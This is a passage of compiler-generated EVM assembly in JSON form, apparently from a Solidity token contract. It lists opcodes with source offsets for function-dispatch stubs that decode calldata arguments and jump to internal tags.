											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "75"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 501,
											"end": 550,
											"name": "CALLDATALOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 501,
											"end": 550,
											"name": "AND"
										},
										{
											"begin": 501,
											"end": 550,
											"name": "PUSH [tag]",
											"value": "76"
										},
										{
											"begin": 501,
											"end": 550,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 1047,
											"end": 1079,
											"name": "tag",
											"value": "15"
										},
										{
											"begin": 1047,
											"end": 1079,
											"name": "JUMPDEST"
										},
										{
											"begin": 1047,
											"end": 1079,
											"name": "PUSH [tag]",
											"value": "63"
										},
										{
											"begin": 1047,
											"end": 1079,
											"name": "PUSH [tag]",
											"value": "78"
										},
										{
											"begin": 1047,
											"end": 1079,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 1085,
											"end": 1117,
											"name": "tag",
											"value": "16"
										},
										{
											"begin": 1085,
											"end": 1117,
											"name": "JUMPDEST"
										},
										{
											"begin": 1085,
											"end": 1117,
											"name": "PUSH [tag]",
											"value": "63"
										},
										{
											"begin": 1085,
											"end": 1117,
											"name": "PUSH [tag]",
											"value": "80"
										},
										{
											"begin": 1085,
											"end": 1117,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 5025,
											"end": 6290,
											"name": "tag",
											"value": "17"
										},
										{
											"begin": 5025,
											"end": 6290,
											"name": "JUMPDEST"
										},
										{
											"begin": 5025,
											"end": 6290,
											"name": "PUSH [tag]",
											"value": "63"
										},
										{
											"begin": 5025,
											"end": 6290,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 5025,
											"end": 6290,
											"name": "DUP1"
										},
										{
											"begin": 5025,
											"end": 6290,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 5025,
											"end": 6290,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "82"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "82"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 5025,
											"end": 6290,
											"name": "CALLDATALOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 5025,
											"end": 6290,
											"name": "AND"
										},
										{
											"begin": 5025,
											"end": 6290,
											"name": "PUSH [tag]",
											"value": "83"
										},
										{
											"begin": 5025,
											"end": 6290,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 381,
											"end": 425,
											"name": "tag",
											"value": "18"
										},
										{
											"begin": 381,
											"end": 425,
											"name": "JUMPDEST"
										},
										{
											"begin": 381,
											"end": 425,
											"name": "PUSH [tag]",
											"value": "63"
										},
										{
											"begin": 381,
											"end": 425,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 381,
											"end": 425,
											"name": "DUP1"
										},
										{
											"begin": 381,
											"end": 425,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 381,
											"end": 425,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "85"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "85"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 381,
											"end": 425,
											"name": "CALLDATALOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 381,
											"end": 425,
											"name": "AND"
										},
										{
											"begin": 381,
											"end": 425,
											"name": "PUSH [tag]",
											"value": "86"
										},
										{
											"begin": 381,
											"end": 425,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 1123,
											"end": 1140,
											"name": "tag",
											"value": "19"
										},
										{
											"begin": 1123,
											"end": 1140,
											"name": "JUMPDEST"
										},
										{
											"begin": 1123,
											"end": 1140,
											"name": "PUSH [tag]",
											"value": "63"
										},
										{
											"begin": 1123,
											"end": 1140,
											"name": "PUSH [tag]",
											"value": "88"
										},
										{
											"begin": 1123,
											"end": 1140,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 820,
											"end": 861,
											"name": "tag",
											"value": "20"
										},
										{
											"begin": 820,
											"end": 861,
											"name": "JUMPDEST"
										},
										{
											"begin": 820,
											"end": 861,
											"name": "PUSH [tag]",
											"value": "63"
										},
										{
											"begin": 820,
											"end": 861,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 820,
											"end": 861,
											"name": "DUP1"
										},
										{
											"begin": 820,
											"end": 861,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 820,
											"end": 861,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "90"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "90"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 820,
											"end": 861,
											"name": "CALLDATALOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 820,
											"end": 861,
											"name": "AND"
										},
										{
											"begin": 820,
											"end": 861,
											"name": "PUSH [tag]",
											"value": "91"
										},
										{
											"begin": 820,
											"end": 861,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 7789,
											"end": 9218,
											"name": "tag",
											"value": "21"
										},
										{
											"begin": 7789,
											"end": 9218,
											"name": "JUMPDEST"
										},
										{
											"begin": 7789,
											"end": 9218,
											"name": "PUSH [tag]",
											"value": "92"
										},
										{
											"begin": 7789,
											"end": 9218,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 7789,
											"end": 9218,
											"name": "DUP1"
										},
										{
											"begin": 7789,
											"end": 9218,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 7789,
											"end": 9218,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "93"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "93"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 7789,
											"end": 9218,
											"name": "CALLDATALOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 7789,
											"end": 9218,
											"name": "AND"
										},
										{
											"begin": 7789,
											"end": 9218,
											"name": "PUSH [tag]",
											"value": "94"
										},
										{
											"begin": 7789,
											"end": 9218,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 7789,
											"end": 9218,
											"name": "tag",
											"value": "92"
										},
										{
											"begin": 7789,
											"end": 9218,
											"name": "JUMPDEST"
										},
										{
											"begin": 7789,
											"end": 9218,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 7789,
											"end": 9218,
											"name": "DUP1"
										},
										{
											"begin": 7789,
											"end": 9218,
											"name": "MLOAD"
										},
										{
											"begin": 7789,
											"end": 9218,
											"name": "SWAP3"
										},
										{
											"begin": 7789,
											"end": 9218,
											"name": "DUP4"
										},
										{
											"begin": 7789,
											"end": 9218,
											"name": "MSTORE"
										},
										{
											"begin": 7789,
											"end": 9218,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 7789,
											"end": 9218,
											"name": "DUP4"
										},
										{
											"begin": 7789,
											"end": 9218,
											"name": "ADD"
										},
										{
											"begin": 7789,
											"end": 9218,
											"name": "SWAP2"
										},
										{
											"begin": 7789,
											"end": 9218,
											"name": "SWAP1"
										},
										{
											"begin": 7789,
											"end": 9218,
											"name": "SWAP2"
										},
										{
											"begin": 7789,
											"end": 9218,
											"name": "MSTORE"
										},
										{
											"begin": 7789,
											"end": 9218,
											"name": "DUP1"
										},
										{
											"begin": 7789,
											"end": 9218,
											"name": "MLOAD"
										},
										{
											"begin": 7789,
											"end": 9218,
											"name": "SWAP2"
										},
										{
											"begin": 7789,
											"end": 9218,
											"name": "DUP3"
										},
										{
											"begin": 7789,
											"end": 9218,
											"name": "SWAP1"
										},
										{
											"begin": 7789,
											"end": 9218,
											"name": "SUB"
										},
										{
											"begin": 7789,
											"end": 9218,
											"name": "ADD"
										},
										{
											"begin": 7789,
											"end": 9218,
											"name": "SWAP1"
										},
										{
											"begin": 7789,
											"end": 9218,
											"name": "RETURN"
										},
										{
											"begin": 438,
											"end": 508,
											"name": "tag",
											"value": "22"
										},
										{
											"begin": 438,
											"end": 508,
											"name": "JUMPDEST"
										},
										{
											"begin": 438,
											"end": 508,
											"name": "PUSH [tag]",
											"value": "58"
										},
										{
											"begin": 438,
											"end": 508,
											"name": "PUSH [tag]",
											"value": "96"
										},
										{
											"begin": 438,
											"end": 508,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 262,
											"end": 302,
											"name": "tag",
											"value": "23"
										},
										{
											"begin": 262,
											"end": 302,
											"name": "JUMPDEST"
										},
										{
											"begin": 262,
											"end": 302,
											"name": "PUSH [tag]",
											"value": "47"
										},
										{
											"begin": 262,
											"end": 302,
											"name": "PUSH [tag]",
											"value": "98"
										},
										{
											"begin": 262,
											"end": 302,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 3005,
											"end": 3144,
											"name": "tag",
											"value": "24"
										},
										{
											"begin": 3005,
											"end": 3144,
											"name": "JUMPDEST"
										},
										{
											"begin": 3005,
											"end": 3144,
											"name": "PUSH [tag]",
											"value": "55"
										},
										{
											"begin": 3005,
											"end": 3144,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 3005,
											"end": 3144,
											"name": "DUP1"
										},
										{
											"begin": 3005,
											"end": 3144,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 3005,
											"end": 3144,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "104"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "104"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3005,
											"end": 3144,
											"name": "DUP2"
										},
										{
											"begin": 3005,
											"end": 3144,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3005,
											"end": 3144,
											"name": "AND"
										},
										{
											"begin": 3005,
											"end": 3144,
											"name": "SWAP1"
										},
										{
											"begin": 3005,
											"end": 3144,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3005,
											"end": 3144,
											"name": "ADD"
										},
										{
											"begin": 3005,
											"end": 3144,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3005,
											"end": 3144,
											"name": "PUSH [tag]",
											"value": "105"
										},
										{
											"begin": 3005,
											"end": 3144,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 515,
											"end": 563,
											"name": "tag",
											"value": "25"
										},
										{
											"begin": 515,
											"end": 563,
											"name": "JUMPDEST"
										},
										{
											"begin": 515,
											"end": 563,
											"name": "PUSH [tag]",
											"value": "63"
										},
										{
											"begin": 515,
											"end": 563,
											"name": "PUSH [tag]",
											"value": "107"
										},
										{
											"begin": 515,
											"end": 563,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 17828,
											"end": 18249,
											"name": "tag",
											"value": "26"
										},
										{
											"begin": 17828,
											"end": 18249,
											"name": "JUMPDEST"
										},
										{
											"begin": 17828,
											"end": 18249,
											"name": "PUSH [tag]",
											"value": "41"
										},
										{
											"begin": 17828,
											"end": 18249,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 17828,
											"end": 18249,
											"name": "DUP1"
										},
										{
											"begin": 17828,
											"end": 18249,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 17828,
											"end": 18249,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "109"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "109"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 17828,
											"end": 18249,
											"name": "CALLDATALOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 17828,
											"end": 18249,
											"name": "AND"
										},
										{
											"begin": 17828,
											"end": 18249,
											"name": "PUSH [tag]",
											"value": "110"
										},
										{
											"begin": 17828,
											"end": 18249,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 672,
											"end": 694,
											"name": "tag",
											"value": "27"
										},
										{
											"begin": 672,
											"end": 694,
											"name": "JUMPDEST"
										},
										{
											"begin": 672,
											"end": 694,
											"name": "PUSH [tag]",
											"value": "58"
										},
										{
											"begin": 672,
											"end": 694,
											"name": "PUSH [tag]",
											"value": "112"
										},
										{
											"begin": 672,
											"end": 694,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 727,
											"end": 748,
											"name": "tag",
											"value": "28"
										},
										{
											"begin": 727,
											"end": 748,
											"name": "JUMPDEST"
										},
										{
											"begin": 727,
											"end": 748,
											"name": "PUSH [tag]",
											"value": "58"
										},
										{
											"begin": 727,
											"end": 748,
											"name": "PUSH [tag]",
											"value": "114"
										},
										{
											"begin": 727,
											"end": 748,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "tag",
											"value": "29"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "JUMPDEST"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "PUSH [tag]",
											"value": "41"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "DUP1"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 16,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 17,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "116"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "116"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "DUP2"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "DUP2"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "AND"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "SWAP2"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "DUP2"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "ADD"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "SWAP1"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "SWAP2"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "AND"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "SWAP1"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "DUP2"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "ADD"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "SWAP1"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "PUSH",
											"value": "60"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "DUP2"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "ADD"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "SWAP1"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "PUSH",
											"value": "FF"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "DUP3"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "ADD"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "AND"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "SWAP1"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "DUP2"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "ADD"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "SWAP1"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "PUSH",
											"value": "C0"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "ADD"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "PUSH [tag]",
											"value": "117"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 6399,
											"end": 7680,
											"name": "tag",
											"value": "30"
										},
										{
											"begin": 6399,
											"end": 7680,
											"name": "JUMPDEST"
										},
										{
											"begin": 6399,
											"end": 7680,
											"name": "PUSH [tag]",
											"value": "63"
										},
										{
											"begin": 6399,
											"end": 7680,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 6399,
											"end": 7680,
											"name": "DUP1"
										},
										{
											"begin": 6399,
											"end": 7680,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 6399,
											"end": 7680,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "119"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "119"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 6399,
											"end": 7680,
											"name": "CALLDATALOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 6399,
											"end": 7680,
											"name": "AND"
										},
										{
											"begin": 6399,
											"end": 7680,
											"name": "PUSH [tag]",
											"value": "120"
										},
										{
											"begin": 6399,
											"end": 7680,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "tag",
											"value": "31"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "JUMPDEST"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "PUSH [tag]",
											"value": "63"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "DUP1"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "122"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "122"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "DUP2"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "DUP2"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "AND"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "SWAP2"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "ADD"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "AND"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "PUSH [tag]",
											"value": "123"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 754,
											"end": 772,
											"name": "tag",
											"value": "32"
										},
										{
											"begin": 754,
											"end": 772,
											"name": "JUMPDEST"
										},
										{
											"begin": 754,
											"end": 772,
											"name": "PUSH [tag]",
											"value": "63"
										},
										{
											"begin": 754,
											"end": 772,
											"name": "PUSH [tag]",
											"value": "125"
										},
										{
											"begin": 754,
											"end": 772,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 18295,
											"end": 18509,
											"name": "tag",
											"value": "33"
										},
										{
											"begin": 18295,
											"end": 18509,
